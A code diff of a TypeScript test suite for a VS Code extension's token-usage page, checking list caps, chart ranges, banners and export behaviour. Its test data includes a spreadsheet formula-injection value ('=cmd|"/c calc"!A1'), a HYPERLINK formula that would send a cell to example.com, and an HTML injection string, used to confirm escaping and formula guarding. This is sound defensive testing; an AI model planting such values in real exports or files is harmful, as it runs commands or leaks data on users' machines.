@@ -46,7 +46,7 @@ function report(overrides: Partial<UsageReport> = {}): UsageReport {
         ],
         dayModels: [{ date: '2026-10-09', model: '=cmd|"/c calc"!A1', variant: null, totals: t }],
         limitWindows: [{ limitType: HOSTILE, resetsAt: 1791561600, hits: 2, firstTs: Date.UTC(2026, 9, 9, 10, 6), date: '2026-10-09' }],
-        omitted: { sessions: 0, projects: 0 },
+        omitted: { sessions: 0, projects: 0, models: 0, efforts: 0, dayModels: 0, limitWindows: 0 },
         coverage: { start: Date.UTC(2026, 9, 1), newest: Date.UTC(2026, 9, 9, 11), requests: 3, files: 4, oversizeLines: 0, malformedLines: 0 },
         ...overrides,
     };
@@ -66,6 +66,7 @@ function view(overrides: Partial<PanelView> = {}): PanelView {
         historyDisabled: false,
         lastImport: undefined,
         sqliteRuntime: undefined,
+        recoveredFrom: undefined,
         extensionVersion: '2.2.0',
         refreshedAt: Date.UTC(2026, 9, 9, 12),
         formatTime: ms => new Date(ms).toISOString().slice(0, 16).replace('T', ' '),
@@ -75,6 +76,34 @@ function view(overrides: Partial<PanelView> = {}): PanelView {
 }
 
 const text = (f: PanelFragments) => f.controls + f.body + f.diagnostics;
+
+/** The page's script, run as the webview would, with only what it uses. */
+function runPage(fragments: PanelFragments): { posted: { type: string; text?: string }[]; click(action: string): string } {
+    const html = renderUsagePage('n0nce', "default-src 'none'", fragments);
+    const script = /<script nonce="n0nce">([\s\S]*)<\/script>/.exec(html)?.[1];
+    assert.ok(script);
+    const posted: { type: string; text?: string }[] = [];
+    const listeners: Record<string, (e: unknown) => void> = {};
+    const element = () => ({ innerHTML: '', open: false });
+    vm.runInNewContext(script, {
+        acquireVsCodeApi: () => ({ postMessage: (m: { type: string }) => posted.push(m) }),
+        document: {
+            getElementById: element,
+            querySelectorAll: () => [],
+            addEventListener: (name: string, fn: (e: unknown) => void) => (listeners[name] = fn),
+            activeElement: null,
+        },
+        window: { addEventListener: (name: string, fn: (e: unknown) => void) => (listeners[`window:${name}`] = fn) },
+        Intl,
+    });
+    return {
+        posted,
+        click: action => {
+            listeners.click({ target: { closest: () => ({ dataset: { action } }) } });
+            return posted.at(-1)?.text ?? '';
+        },
+    };
+}
 
 suite('usage page', () => {
     test('every empty state says why, and what would change it', () => {
@@ -130,9 +159,54 @@ suite('usage page', () => {
     });
 
     test('the cap is disclosed on the page and in the export', () => {
-        const capped = renderFragments(view({ report: report({ omitted: { sessions: 7, projects: 2 } }) }));
+        const capped = renderFragments(view({ report: report({ omitted: { sessions: 7, projects: 2, models: 0, efforts: 0, dayModels: 0, limitWindows: 0 } }) }));
         assert.ok(capped.body.includes('7 smaller sessions') && capped.body.includes('2 smaller projects'));
         assert.ok(capped.copy.notes.some(n => n.includes('7 smaller sessions')));
+    });
+
+    test('every capped list says how many rows it left out', () => {
+        const capped = renderFragments(
+            view({ report: report({ omitted: { sessions: 0, projects: 0, models: 3, efforts: 2, dayModels: 5, limitWindows: 4 } }) }),
+        );
+        assert.ok(capped.body.includes('…and 3 smaller models, counted in the totals'));
+        assert.ok(capped.body.includes('…and 2 smaller effort levels, counted in the totals'));
+        assert.ok(capped.body.includes('…and 4 earlier ones, not listed.'));
+        assert.ok(capped.csv.notes.includes('5 older day-and-model rows are counted in the totals but not listed'));
+        const whole = renderFragments(view());
+        assert.ok(!whole.body.includes('…and') && !whole.csv.notes.some(n => n.includes('not listed')));
+    });
+
+    test('past 400 days, the newest are drawn, and the note says the rest are in the totals', () => {
+        const t = totals(5);
+        const long = report({
+            range: 'coverage',
+            from: '2025-01-01',
+            to: '2026-10-09',
+            days: [{ date: '2025-01-01', totals: t }, { date: '2025-09-04', totals: t }, { date: '2026-10-09', totals: t }],
+        });
+        const body = renderFragments(view({ report: long })).body;
+        assert.strictEqual((body.match(/class="column"/g) ?? []).length, 400);
+        // 400 days back from the 9th of October, inclusive.
+        assert.ok(body.includes('<span>2025-09-05</span><span>2026-10-09</span>'), 'not the newest 400 days');
+        assert.ok(body.includes('The newest 400 are drawn; 2 earlier days with requests are in the totals.'));
+        assert.ok(!renderFragments(view()).body.includes('The newest'));
+    });
+
+    test('with its data folder gone, a kept history is still shown, under a banner that says so', () => {
+        const gone = { roots: [{ path: '~/.claude', source: 'the default', exists: false }] };
+        const kept = text(renderFragments(view({ status: 'no-roots', ...gone })));
+        assert.ok(kept.includes('No Claude Code data folder is found now, so this is the history kept so far.'));
+        assert.ok(kept.includes('data-action="chooseFolder"') && kept.includes('By model'), 'the history was not shown');
+        const none = text(renderFragments(view({ status: 'no-roots', ...gone, report: report({ coverage: { ...report().coverage, requests: 0 } }) })));
+        assert.ok(none.includes('No Claude Code data folder found') && !none.includes('By model'));
+    });
+
+    test('a history moved aside is named, on the page and in the diagnostics', () => {
+        const moved = renderFragments(view({ recoveredFrom: `usage.sqlite.corrupt-${HOSTILE}` }));
+        assert.ok(moved.body.includes('The history could not be read, so it was moved aside as usage.sqlite.corrupt-&lt;img'));
+        assert.ok(/<dt>Moved aside<\/dt><dd>usage\.sqlite\.corrupt-&lt;img/.test(moved.diagnostics), moved.diagnostics.slice(0, 400));
+        assert.ok(!text(moved).includes(`corrupt-${HOSTILE}`));
+        assert.ok(!text(renderFragments(view())).includes('moved aside'));
     });
 
     test('a day with nothing still gets a column, so a gap reads as a gap', () => {
@@ -151,39 +225,38 @@ suite('usage page', () => {
     });
 
     test("the page's own exports quote, guard formulas, and open with their notes", () => {
-        // The page's script, run as the webview would, with only what it uses.
-        const fragments = renderFragments(view());
-        const html = renderUsagePage('n0nce', "default-src 'none'", fragments);
-        const script = /<script nonce="n0nce">([\s\S]*)<\/script>/.exec(html)?.[1];
-        assert.ok(script);
-        const posted: { type: string; text?: string }[] = [];
-        const listeners: Record<string, (e: unknown) => void> = {};
-        const element = () => ({ innerHTML: '', open: false });
-        const context = {
-            acquireVsCodeApi: () => ({ postMessage: (m: { type: string }) => posted.push(m) }),
-            document: {
-                getElementById: element,
-                querySelectorAll: () => [],
-                addEventListener: (name: string, fn: (e: unknown) => void) => (listeners[name] = fn),
-                activeElement: null,
-            },
-            window: { addEventListener: (name: string, fn: (e: unknown) => void) => (listeners[`window:${name}`] = fn) },
-            Intl,
-        };
-        vm.runInNewContext(script, context);
-        assert.deepStrictEqual(posted[0]?.type, 'ready');
+        const page = runPage(renderFragments(view()));
+        assert.deepStrictEqual(page.posted[0]?.type, 'ready');
 
-        const click = (action: string) => listeners.click({ target: { closest: () => ({ dataset: { action } }) } });
-        click('export');
-        const csv = posted.at(-1)?.text ?? '';
+        const csv = page.click('export');
         const lines = csv.split('\n');
         assert.ok(lines[0].startsWith('# extension: LLM Tokenizer 2.2.0'));
         assert.ok(lines.includes('"date","model","variant","requests","input_tokens","cache_creation_input_tokens","cache_creation_5m","cache_creation_1h","cache_read_input_tokens","output_tokens","thinking_tokens","web_search_requests","web_fetch_requests","complete"'));
         assert.ok(csv.includes(`"'=cmd|""/c calc""!A1"`), 'a model id was left able to run as a formula');
 
-        click('copy');
-        const copied = posted.at(-1)?.text ?? '';
+        const copied = page.click('copy');
         assert.ok(copied.split('\n').some(l => l.split('\t').length === 5 && l.includes(HOSTILE)), 'a session row lost its columns');
+    });
+
+    test('Copy guards formulas as the CSV does: pasted, a cell is read the same way', () => {
+        const formula = '=HYPERLINK("https://example.com/?"&A1)';
+        const session = { ...report().sessions[0], label: formula, sessionId: '+1' };
+        const copied = runPage(renderFragments(view({ report: report({ sessions: [session] }) }))).click('copy');
+        const row = copied.split('\n').find(l => l.includes('HYPERLINK'))?.split('\t');
+        assert.deepStrictEqual(row?.slice(1, 3), [`'${formula}`, "'+1"]);
+    });
+
+    test('an export is stamped when it is made, not when the page last had data', async () => {
+        const fragments = renderFragments(view());
+        await new Promise(resolve => setTimeout(resolve, 5));
+        // Nothing in the data moves with the clock, so data unchanged is not posted again.
+        assert.deepStrictEqual(renderFragments(view()), fragments);
+        const page = runPage(fragments);
+        const stamp = (text: string) => /^# exported: (.+)$/m.exec(text)?.[1];
+        const clicked = Date.now();
+        const csv = stamp(page.click('export'));
+        assert.ok(csv && Date.parse(csv) >= clicked, `stamped ${csv}, clicked ${new Date(clicked).toISOString()}`);
+        assert.ok(stamp(page.click('copy')));
     });
 
     test('the page carries the nonce and a strict policy, and its data cannot close the script', () => {
